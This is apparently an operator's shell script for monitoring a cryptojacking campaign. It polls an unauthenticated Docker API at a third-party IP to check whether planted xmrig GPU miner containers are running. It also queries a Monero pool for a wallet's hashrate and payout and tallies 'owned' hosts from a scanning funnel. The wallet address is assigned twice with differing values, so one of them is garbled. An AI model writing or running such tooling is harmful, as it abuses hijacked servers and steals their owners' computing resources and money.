#!/bin/sh
# throwaway: are the GPU miners actually running / producing?
#
# Three independent read-outs, because container stdout is unreadable here:
#   1) State on the daemon: Status/Running/ExitCode/FinishedAt. An exited CUDA
#      xmrig is the expected shape if there is no usable GPU (it does NOT fall
#      back to CPU): exit 1 = xmrig error, 137 = OOM/killed, 127 = no binary.
#   2) The pool census. We signed in with -p <ip>, so a working miner shows up as
#      that worker id with hashrate. This is the only true "is it mining" signal.
#   3) The funnel's partial counts, for context.
H=134.209.121.89
W=46Md49vuZSSDDG5e2FhStjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6
W=46Md49vuZSSDDG5e2FhStfYxszzfDgnjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6

echo "=== our containers on $H"
curl -sS -m 8 "http://$H:2375/containers/json?all=1" 2>/dev/null | sed 's/},{/}\n{/g' \
  | grep -o '"Names":\[[^]]*\][^}]*"State":"[a-z]*"' | head -8
for n in kwgpu kwgpu2; do
    echo "-- $n"
    st=$(curl -sS -m 8 "http://$H:2375/containers/$n/json" 2>/dev/null)
    printf '%s' "$st" | grep -o '"Status":"[^"]*"' | head -1
    printf '%s' "$st" | grep -o '"Running":[a-z]*' | head -1
    printf '%s' "$st" | grep -o '"ExitCode":[0-9-]*' | head -1
    printf '%s' "$st" | grep -o '"FinishedAt":"[^"]*"' | head -1
    printf '%s' "$st" | grep -o '"OOMKilled":[a-z]*' | head -1
done

echo "=== pool census"
for attempt in 1 2 3; do
    curl -sS -m 25 "http://pool.supportxmr.com/api/miner/$W/stats" -o /tmp/_p.json 2>/dev/null
    sz=$(wc -c < /tmp/_p.json 2>/dev/null)
    echo "attempt$attempt bytes=$sz"
    [ "${sz:-0}" -gt 200 ] && break
    sleep 3
done
if [ "${sz:-0}" -gt 200 ]; then
    grep -o '"hash":"[^"]*"' /tmp/_p.json | head -2
    grep -o '"hash24h":"[^"]*"' /tmp/_p.json | head -1
    grep -o '"amtDue":[0-9]*' /tmp/_p.json | head -1
    echo "gpu_worker_present=$(grep -c '134.209.121.89' /tmp/_p.json)"
    echo "gpu worker lines:"; tr ',' '\n' < /tmp/_p.json | grep '134.209' | head -6
fi

echo "=== funnel partial"
wc -l /tmp/_funnel.out 2>/dev/null
echo "owned_probed=$(wc -l < /tmp/_f_res.txt 2>/dev/null)"
awk '{print $2}' /tmp/_f_res.txt 2>/dev/null | sort | uniq -c
date -u
